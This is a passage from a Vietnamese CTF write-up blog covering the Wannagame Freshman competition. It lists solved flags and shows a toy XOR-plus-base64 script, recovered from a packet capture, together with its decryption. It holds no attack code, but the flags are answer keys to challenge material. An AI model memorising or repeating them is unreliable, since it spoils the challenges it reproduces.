  <li>Flag: <strong>W1{I_th1nk_u_r_so_lite^_^}</strong>
    <h2 id="bài-4-differences"><span class="me-2">Bài 4 Differences:</span><a href="#bài-4-differences" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/741e394e-645f-4cb2-89b8-b9b3af8480c8" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/741e394e-645f-4cb2-89b8-b9b3af8480c8" alt="image" loading="lazy"></a></p>
  </li>
  <li>Flag ngay ở trong file</li>
  <li>Flag: <strong>W1{SaKur4_s0_b34uTiFuL_RI9ht?????}</strong>
    <h2 id="bài-5-free-flag"><span class="me-2">Bài 5 Free Flag:</span><a href="#bài-5-free-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a6a78c9-2a29-4b8f-8bad-06ac8edf244d" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a6a78c9-2a29-4b8f-8bad-06ac8edf244d" alt="image" loading="lazy"></a></p>
  </li>
  <li>Đọc file pcapng ta tìm được source và key</li>
</ul>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>

<span class="n">BANNER</span> <span class="o">=</span> <span class="sh">"""</span><span class="s"> ___       __   ________  ________   ________   ________  ___       __     _____  ________      
|\  \     |\  \|\   __  \|\   ___  \|\   ___  \|\   __  \|\  \     |\  \  / __  \|\   ___  \    
\ \  \    \ \  \ \  \|\  \ \  </span><span class="se">\\</span><span class="s">\ \  \ \  </span><span class="se">\\</span><span class="s">\ \  \ \  \|\  \ \  \    \ \  \|\/_|\  \ \  </span><span class="se">\\</span><span class="s">\ \  \   
 \ \  \  __\ \  \ \   __  \ \  </span><span class="se">\\</span><span class="s">\ \  \ \  </span><span class="se">\\</span><span class="s">\ \  \ \   __  \ \  \  __\ \  \|/ \ \  \ \  </span><span class="se">\\</span><span class="s">\ \  \  
  \ \  \|\__\_\  \ \  \ \  \ \  </span><span class="se">\\</span><span class="s">\ \  \ \  </span><span class="se">\\</span><span class="s">\ \  \ \  \ \  \ \  \|\__\_\  \   \ \  \ \  </span><span class="se">\\</span><span class="s">\ \  \ 
   \ \____________\ \__\ \__\ \__</span><span class="se">\\</span><span class="s">\ \__\ \__</span><span class="se">\\</span><span class="s">\ \__\ \__\ \__\ \____________\   \ \__\ \__</span><span class="se">\\</span><span class="s">\ \__</span><span class="se">\\</span><span class="s">
    \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________|    \|__|\|__| \|__|
</span><span class="sh">"""</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">deadbeef</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">encryptSecret</span><span class="p">(</span><span class="n">secret</span><span class="p">):</span>
    <span class="n">lst_byte</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">secret</span><span class="p">)):</span>
        <span class="n">enc_byte</span> <span class="o">=</span> <span class="nf">ord</span><span class="p">(</span><span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">KEY</span><span class="p">)]</span>
        <span class="n">lst_byte</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">enc_byte</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">))</span>
    
    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="n">_</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">lst_byte</span><span class="p">])).</span><span class="nf">decode</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">BANNER</span><span class="p">)</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt; Please give me your secret: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">&gt; Here is your encrypted secret:</span><span class="sh">"</span><span class="p">,</span> <span class="nf">encryptSecret</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b9af05e2-79f2-40e9-ab06-2bbbacface9e" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b9af05e2-79f2-40e9-ab06-2bbbacface9e" alt="image" loading="lazy"></a></p>

<ul>
  <li>Decrypt lại ta sẽ có flag</li>
</ul>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>

<span class="n">KEY</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">deadbeef</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decryptSecret</span><span class="p">(</span><span class="n">encrypted_secret</span><span class="p">):</span>
    <span class="n">encrypted_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">encrypted_secret</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
    <span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="n">encrypted_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">KEY</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">encrypted_bytes</span><span class="p">))]</span>
    <span class="n">decrypted_text</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">decrypted_bytes</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">decrypted_text</span>

<span class="n">secret</span> <span class="o">=</span> <span class="sh">"</span><span class="s">iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=</span><span class="sh">"</span>

<span class="nf">print</span><span class="p">(</span><span class="nf">decryptSecret</span><span class="p">(</span><span class="n">secret</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Flag: <strong>W1{<em>w3llC0mE_tO_w4nNaw1N</em>}</strong></li>
  <li><del><strong>Mấy bài còn lại mình chưa biết làm do dark quá</strong></del></li>
</ul>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf-writeup/">CTF Writeup</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/sql-injectiom/"
            class="post-tag no-text-decoration"
          >SQL Injectiom</a>
        
          <a
            href="/tags/ssti/"
            class="post-tag no-text-decoration"
          >SSTI</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Wannagame%20Freshman%20CTF%20writeup%20-%20Yuu's%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWannagame-Freshman%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Wannagame%20Freshman%20CTF%20writeup%20-%20Yuu's%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWannagame-Freshman%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWannagame-Freshman%2F&text=Wannagame%20Freshman%20CTF%20writeup%20-%20Yuu's%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/PicoCTF2024/">PicoCTF 2024</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/AsisCTF/">Asis CTF 2023 Writeup</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/prototype-pollution/">Prototype Pollution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/sql-injectiom/">SQL Injectiom</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/symlink/">Symlink</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/W1Playground/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1709049600"
  data-df="ll"
  
>
  Feb 27, 2024
</time>

              <h4 class="pt-0 my-2">W1 Playground Writeup</h4>
              <div class="text-muted">
                <p>Bài 1: easy login



Phân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”





Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/AsisCTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1695571200"
  data-df="ll"
  
>
  Sep 24, 2023
</time>

              <h4 class="pt-0 my-2">Asis CTF 2023 Writeup</h4>
              <div class="text-muted">
                <p>Asis-CTF-2023-Writeup
Bài 1 hello:

  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà mu...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/PicoCTF2024/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1711555200"
  data-df="ll"
  
>
  Mar 27, 2024
</time>

              <h4 class="pt-0 my-2">PicoCTF 2024</h4>
              <div class="text-muted">
                <p>PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/AsisCTF/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Asis CTF 2023 Writeup</p>
    </a>
  

  
    <a
      href="/posts/W1Playground/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>W1 Playground Writeup</p>
    </a>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://github.com/anzuukino">Yuu</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v6.5.5"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/prototype-pollution/">Prototype Pollution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/sql-injectiom/">SQL Injectiom</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/symlink/">Symlink</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  





    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

